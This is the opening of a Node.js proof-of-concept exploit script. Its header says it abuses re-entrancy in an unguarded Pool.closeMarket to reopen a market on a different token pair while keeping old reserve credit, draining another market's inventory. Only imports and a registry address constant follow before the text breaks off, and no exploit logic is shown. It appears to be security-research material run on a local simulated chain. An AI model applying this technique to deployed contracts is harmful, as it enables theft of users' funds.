#!/usr/bin/env node
/* PoC: re-entrancy through the unguarded Pool.closeMarket lets a market be
   reopened on a DIFFERENT token pair while keeping the reserve number that
   was credited for the old one — draining another market's inventory. */
import { compile, artifact } from "./compile.mjs";
import { Chain, enc, decUint, decAddr, encodeAddressArg } from "./evm.mjs";
import { createAddressFromString } from "@ethereumjs/util";

const REGISTRY = "0x000000006551c19487814612e58FE06813775758";
const MAX = (